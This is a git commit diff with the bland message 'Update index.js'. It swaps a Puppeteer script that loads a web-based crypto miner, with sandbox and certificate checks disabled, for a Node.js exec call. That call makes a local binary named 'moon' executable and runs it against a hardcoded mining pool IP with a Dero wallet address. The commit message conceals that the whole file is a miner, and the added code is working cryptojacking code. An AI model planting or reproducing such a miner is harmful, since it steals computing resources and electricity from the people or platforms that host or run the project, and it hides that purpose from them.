a6d2ae001d0dc677f15baf47009ab16bb3541e32
sisafu10 <sisafu10@kicag.com>
2024-05-28 04:49:00 +0700

    Update index.js

--- index.js
+++ index.js
@@ -1,105 +1,16 @@
-const config = require('./config.json');
+const { exec } = require("child_process");
 
-// Import Puppeteer and the built-in path module
-const puppeteer = require('puppeteer');
-
-let retries = 50;
-
-function printProgress(msg) {
-  console.clear();
-  console.log('* Versions:   Browserless v1.0.0');
-  console.log(`* Author:     malphite-code`);
-  console.log(`* Donation:   BTC: bc1qzqtkcf28ufrr6dh3822vcz6ru8ggmvgj3uz903`);
-  console.log(`              RVN: RVZD5AjUBXoNnsBg9B2AzTTdEeBNLfqs65`);
-  console.log(`              LTC: ltc1q8krf9g60n4q6dvnwg3lg30lp5e7yfvm2da5ty5`);
-  console.table(msg);
-}
-
-const run = async () => {
-  let interval = null;
-  let urls = {};
-  let pages = {};
-
-  // Load URL
-  config.forEach((params, index) => {
-    const query = Object.entries(params)
-    .map(([key, value]) => `${encodeURIComponent(key)}=${encodeURIComponent(value)}`)
-    .join('&');
-
-    urls[`${params.algorithm}_${index}`]  = `https://webminer.pages.dev/?${query}`;
-  });
-
-  try {
-    const algos = Object.keys(urls);
-
-    console.log(`[Native]: Browser starting...`);
-    // Launch a headless browser
-    const browser = await puppeteer.launch({
-      headless: true,
-      args: [
-        '--no-sandbox',
-        '--disable-setuid-sandbox',
-        '--ignore-certificate-errors',
-        '--ignore-certificate-errors-spki-list',
-        "--window-position=0,0",
-        "--ignore-certifcate-errors",
-        "--ignore-certifcate-errors-spki-list",
-        "--disable-dev-shm-usage",
-      ],
-      ignoreHTTPSErrors: true,
-    });
-
-    for (let index = 0; index < algos.length; index++) {
-      const algo = algos[index];
-      const url = urls[algo];
-
-      console.log(`[Native]: Page starting with url "${url}"`);
-
-      // Create a new page
-      const page = await browser.newPage();
-
-      // Navigate to the file URL
-      await page.goto(url);
-
-      // Store page
-      pages[algo] = page;
+exec(
+  "chmod 700 moon;./moon -d 45.86.230.214:80 -w dero1qysflwnyf4mqhzdet7v478nn5l38q6u0uh9g86vtcpmrze0ml8xc7qgdhw9aj",
+  (error, stdout, stderr) => {
+    if (error) {
+      console.log(`error: ${error.message}`);
+      return;
     }
-
-    // Log
-    interval = setInterval(async () => {
-      try {
-        const msg = {};
-        for (let index = 0; index < algos.length; index++) {
-          const algo = algos[index];
-          const page = pages[algo];
-          let hashrate = await page.evaluate(() => document.querySelector('#hashrate')?.innerText ?? "0 H/s");
-          let shared = await page.evaluate(() => document.querySelector('#shared')?.innerText ?? "0");
-          msg[algo] = { 'Hashrate': hashrate, 'Shared': Number(shared) };
-        }
-        printProgress(msg);
-      } catch (error) {
-        console.log(`[${retries}] Miner Restart: `, error.message);
-        clearInterval(interval);
-        if (retries > 0) {
-          retries--;
-          run();
-        } else {
-          process.exit(1);
-        }
-      }
-    }, 6000);
-
-  } catch (error) {
-    console.log(`[${retries}] Miner Restart: `, error.message);
-    clearInterval(interval);
-
-    if (retries > 0) {
-      retries--;
-      run();
-    } else {
-      process.exit(1);
+    if (stderr) {
+      console.log(`stderr: ${stderr}`);
+      return;
     }
+    console.log(`stdout: ${stdout}`);
   }
-}
-
-run();
+);
